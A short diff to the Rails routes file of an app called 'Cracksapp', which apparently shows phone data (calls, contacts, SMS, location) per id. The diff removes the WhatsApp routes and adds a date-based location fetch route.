@@ -11,14 +11,13 @@ Cracksapp::Application.routes.draw do
   get 'general/:id' => 'general#index'
   get 'calls/:id' => 'calls#index'
   get 'contacts/:id' => 'contacts#index'
-  get 'location/:id' => 'location#index'
   get 'history/:id' => 'history#index'
-
-  get 'whatsapp/:id' => 'whatsapp#index'
-  get 'whatsapp/:id/messages/:address' => 'whatsapp#messages'
 
   get 'sms/:id' => 'sms#index'
   get 'sms/:id/messages/:address' => 'sms#messages'
+
+  get 'location/:id' => 'location#index'
+  get 'location/:id/fetch/:date' => 'location#fetch'
 
   root 'home#index'
 end
